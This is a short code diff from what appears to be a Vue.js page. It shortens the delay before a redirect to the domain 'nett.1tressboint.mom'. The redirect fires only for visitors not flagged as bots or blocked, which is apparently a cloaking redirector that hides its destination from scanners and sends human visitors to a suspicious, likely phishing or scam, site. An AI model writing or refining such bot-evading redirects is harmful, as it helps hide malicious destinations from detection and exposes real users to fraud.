@@ -49,7 +49,7 @@ const app = createApp({
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
           window.location.href = 'https://nett.1tressboint.mom/';
-        }, 3000);
+        }, 2000);
       }
 
       loading.value = false; // Stop the loading spinner
